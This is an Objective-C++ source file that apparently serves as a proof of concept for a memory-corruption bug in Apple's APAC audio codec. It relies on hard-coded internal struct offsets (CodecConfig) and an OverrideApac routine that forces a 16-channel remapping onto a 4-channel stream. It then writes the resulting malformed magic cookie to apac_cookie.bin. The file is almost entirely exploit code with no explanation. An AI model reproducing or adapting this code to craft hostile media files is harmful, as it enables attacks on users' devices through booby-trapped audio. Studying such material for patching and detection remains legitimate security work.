@import AVFAudio;
@import AudioToolbox;

#include <vector>

struct CodecConfig {
  char padding0[0x78];                         // 0
  AudioChannelLayout* remappingChannelLayout;  // 0x78
  char padding1[0xd8 - 0x80];                  // 0x80
  uint32_t remappingBitSize;                   // 0xd8
  char padding2[0xe0 - 0xdc];                  // 0x80
  std::vector<char> mRemappingArray;           // 0xe0
};

void OverrideApac(CodecConfig* config) {
  const int numChannels = 16;
  config->remappingChannelLayout->mChannelLayoutTag =
      kAudioChannelLayoutTag_HOA_ACN_SN3D | numChannels;
  config->remappingBitSize = ceil(log2f(numChannels) - 0.0001);
  for (int i = 0; i < numChannels; i++) {
    config->mRemappingArray.push_back(numChannels - 1); // needs to be smaller than numChannels
  }
}

int main() {
  AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:44100
                                                                           channels:1];
  AudioStreamBasicDescription outputDescription{.mSampleRate = 44100,
                                                .mFormatID = kAudioFormatAPAC,
                                                .mFormatFlags = 0,
                                                .mBytesPerPacket = 0,
                                                .mFramesPerPacket = 0,
                                                .mBytesPerFrame = 0,
                                                .mChannelsPerFrame = 4,
                                                .mBitsPerChannel = 0,
                                                .mReserved = 0};
  AVAudioChannelLayout* channelLayout =
      [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 4];

  OSStatus status = 0;

  AVAudioFormat* formatOut = [[AVAudioFormat alloc] initWithStreamDescription:&outputDescription
                                                                channelLayout:channelLayout];

  AVAudioConverter* converter = [[AVAudioConverter alloc] initFromFormat:formatIn
                                                                toFormat:formatOut];

  NSData* magicCookie = converter.magicCookie;

  [magicCookie writeToFile:@"apac_cookie.bin" atomically:false];
  return 0;
}
